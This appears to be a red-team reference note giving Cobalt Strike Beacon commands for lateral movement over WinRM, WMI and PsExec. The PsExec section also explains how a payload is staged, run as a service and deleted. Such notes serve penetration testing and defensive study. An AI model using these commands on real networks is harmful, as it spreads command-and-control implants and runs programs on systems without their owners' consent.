# Cobalt Strike Lateral Movement

---

## WinRM

See [[active-directory-lateral-movement#WinRM|here]] for conceptual background.

For a Beacon:

```beacon
jump winrm[64] $TARGET_FQDN_OR_IP $LISTENER
```

To execute a single program:

```beacon
remote-exec winrm $TARGET_FQDN_OR_IP $PROGRAM_PATH $PROGRAM_ARGS
```

- `$PROGRAM_PATH` is from the target's perspective

---

## WMI

See [[active-directory-lateral-movement#Windows Management Instrumentation WMI|here]] for conceptual background.

To execute a single program:

```beacon
remote-exec wmi $TARGET_FQDN_OR_IP $PROGRAM_PATH $PROGRAM_ARGS
```

- `$PROGRAM_PATH` is from the target's perspective

---

## PsExec

See [[active-directory-lateral-movement#PsExec|here]] for conceptual background.

To spawn a new Beacon:

```beacon
jump psexec[64] $TARGET_FQDN_OR_IP $LISTENER
```

- Stages binary payload to target
- Creates and runs service pointing at binary payload
- Migrates beacon to new process
- Deletes the binary payload

To spawn a new Beacon:

```beacon
jump psexec_psh $TARGET_FQDN_OR_IP $LISTENER
```

- Creates and runs service pointing at stageless beacon payload
	- Always 32-bit payload
